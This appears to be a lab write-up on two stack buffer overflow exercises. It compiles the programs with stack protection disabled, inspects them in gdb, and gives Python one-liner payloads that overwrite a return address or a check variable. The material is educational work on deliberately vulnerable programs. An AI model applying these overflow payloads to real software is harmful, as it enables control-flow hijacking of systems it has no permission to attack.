## bof1.c  
In this attack, we aim to overwrite the return address with the address of a different function (redirect control) using Python!  


# Stackframe


# Vulnerability  
At the function `gets(array);` the attacker can control the flow of execution by input larger than 200 bytes  


# Attack  
Compile file without stack protection  
`gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`  
![image](https://github.com/user-attachments/assets/303e297a-27f9-4b2e-8cb6-32dbc0df52a6)


Run gdb  
`gdb bof1.out`
![image](https://github.com/user-attachments/assets/98f15c46-056c-4148-ad6c-85b96eefae6c)


Disassemble the vuln function  
`disas vuln`  
![image](https://github.com/user-attachments/assets/46f661a8-3fca-4ea3-b963-3af801d59cd6)


Disassemble secretFunc  
`disas secretFunc`  
![image](https://github.com/user-attachments/assets/12485e26-6f6b-4cbd-bd57-d074811f5878)

The address of 'secretFunc' is 0x0804846b  

To attack, based on the stackframe we need 204 bytes   
To quit  
`q`  
To create 204 bytes by generate 204 characters 'a'  
`echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')") | ./bof1.out 123`
![image](https://github.com/user-attachments/assets/9bce4ca9-6a20-4c71-8a37-569512138885)


## bof2.c
To exploit `bof2.c`, we aim to overwrite the return address `vuln()` function and redirect the flow of execution to the `secretFunc()`  


# Stackframe


# Vulnerability
To overwrite the `check` variable, the attacker need to provide input that fills the 40-byte buffer and writes additional bytes to overwrite `check`  

# Attack
Compile the program without stack protection  
`gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2`
![image](https://github.com/user-attachments/assets/e5982a17-89cd-48aa-8cd0-c958af4d9dc4)



Run gdb  
`gdb bof2.out`  
![image](https://github.com/user-attachments/assets/69fd4a19-e3db-4ecf-9507-bb940ed0280a)


Set a breakpoint at the `fgets` function  
`break fgets`  
![image](https://github.com/user-attachments/assets/a7c423ce-e804-49e9-b50b-2e9767f2ac51)


Run the program
`run`  
![image](https://github.com/user-attachments/assets/aafeed61-f26c-424c-a7ee-abf5e3916036)


To attack, based on the stackframe we need 44 bytes  
Quit `q`  
To create 44 bytes by generate 40 characters 'a' and 4 characters 'b'  `echo $(python -c "print('a' * 40 + 'b' * 4 + '\xef\xbe\xad\xde')") | ./bof2.out 123`  
![image](https://github.com/user-attachments/assets/b831c2aa-51d9-4ce1-ab5c-669d6e5961ce)


Manipulate the program's memory by overflowing a fixed-length buffer by generate 40 bytes `echo $(python -c "print('a' * 40 + '\xef\xbe\xad\xde')") | ./bof2.out 123`  
![image](https://github.com/user-attachments/assets/a895e807-c274-45ca-bc72-ffdda1f614ed)